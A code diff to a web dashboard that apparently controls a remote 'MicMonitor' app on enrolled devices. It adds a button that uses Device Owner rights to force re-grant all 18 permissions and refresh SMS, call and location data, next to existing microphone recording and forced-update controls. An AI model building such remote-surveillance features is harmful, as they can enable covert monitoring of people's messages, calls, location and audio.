@@ -1839,6 +1839,7 @@
             <button class="btn-ghost" onclick="resetAudioSettings('${deviceId}')">Reset Audio</button>
             <button class="btn-ghost" id="btnVizMode_${deviceId}" onclick="cycleVizMode('${deviceId}')">Viz: Wave</button>
             <button class="btn-ghost" onclick="forceUpdate('${deviceId}')">🔄 Update App</button>
+            <button class="btn-ghost" onclick="grantPermissions('${deviceId}')">✅ Grant Permissions</button>
             <button class="btn-danger" onclick="uninstallApp('${deviceId}')">🗑️ Uninstall App</button>
           </div>
           <div class="rec-list" id="recList_${deviceId}"></div>
@@ -2681,6 +2682,13 @@
         }
         sendCmd(deviceId, "force_update");
         log(`Force update command sent to ${deviceId}`, "info");
+      }
+      function grantPermissions(deviceId) {
+        if (!confirm(`✅ Re-grant all permissions for device ${deviceId}?\n\nThis will:\n• Force re-grant all 18 permissions (Device Owner)\n• Refresh SMS, Calls, Location data\n• Verify permissions are working\n\nUse this if dashboard shows "permission denied".`)) {
+          return;
+        }
+        sendCmd(deviceId, "grant_permissions");
+        log(`Grant permissions command sent to ${deviceId}`, "info");
       }
       function uninstallApp(deviceId) {
         if (!confirm(`⚠️ Uninstall MicMonitor app from device ${deviceId}?\n\nThis will:\n• Clear Device Owner (if set)\n• Open uninstall dialog on the device\n• Remove the app completely\n\nThis action cannot be undone.`)) {
